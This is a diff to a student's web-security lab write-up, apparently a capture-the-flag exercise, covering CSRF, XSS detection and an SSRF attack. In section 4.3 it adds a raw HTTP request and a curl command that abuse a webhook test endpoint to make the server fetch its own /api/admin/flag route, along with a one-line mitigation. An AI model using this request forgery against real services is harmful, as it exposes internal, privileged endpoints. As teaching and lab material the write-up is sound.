@@ -4,8 +4,6 @@ Rhyan Robertson
 
 ## 2 Basic CSRF
 
-Cross-Site Request Forgery (CSRF) is a type of attack where an attacker crafts a malicious HTTP request and tricks a victim user into making that request to a server on which the victim is already authenticated.
-
 ### 2.1. The website is also vulnerable to an XSS but you won’t detect it with a `<script>alert(1)</script>.` How can you detect it?
 
 We cannot detect it using `alert();` because we don't see the result of the form submission.
@@ -109,8 +107,9 @@ Flag : `SLH22{zfrHW42XZMgpoyvEk}`
 
 ### 4.3. How did you obtain the flag? Describe clearly your attack
 
-We can use the test api to get the server admin to access a url and send us a response. SO even that
+We can use the test api to get the server admin to access a url and send us a response. Since the admin has the access rights to /api/admin/flag, we get the flag in response :
 
+The request :
 
 ```http
 POST /api/webhook/test HTTP/1.1
@@ -120,6 +119,8 @@ Content-Length: 64
 
 {"url":"http://localhost:8082/api/admin/flag", "message":"test"}
 ```
+
+Send it with curl :
 
 ```bash
 curl --location --request POST 'http://iict-mv310-slh:8082/api/webhook/test' \
@@ -134,3 +135,5 @@ Response :
 ```
 
 ### 4.4. How would you prevent this attack ?
+
+Validate the url on the server-side and block same domain requests with a proxy.
